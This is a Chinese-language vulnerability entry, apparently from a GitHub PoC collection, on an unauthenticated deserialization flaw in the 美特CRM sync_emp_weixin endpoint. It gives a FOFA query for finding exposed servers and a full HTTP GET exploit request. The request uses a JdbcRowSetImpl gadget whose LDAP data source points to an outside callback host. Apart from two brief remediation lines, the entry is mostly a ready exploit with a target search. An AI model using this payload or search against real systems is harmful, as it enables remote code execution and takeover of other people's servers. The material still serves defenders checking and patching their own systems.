# 美特CRM sync_emp_weixin存在反序列化漏洞

# 漏洞描述

美特CRM sync_emp_weixin存在反序列化漏洞，未经身份验证攻击者可执行危险代码，获取系统权限，导致网站处于极度不安全状态。

# 影响版本

美特CRM

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/common/scripts/basic.js" && icon_hash="-932760915"

POC/EXP：

GET /weixin/admin/sync_emp_weixin.jsp?emp_json=[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://ueychday.eyes.sh%22,%22autoCommit%22:true}] HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

![image-20241030131926645](./.resource/美特CRMsync_emp_weixin存在反序列化漏洞/media/image-20241030131926645.png)


![image-20241030131959383](./.resource/美特CRMsync_emp_weixin存在反序列化漏洞/media/image-20241030131959383.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
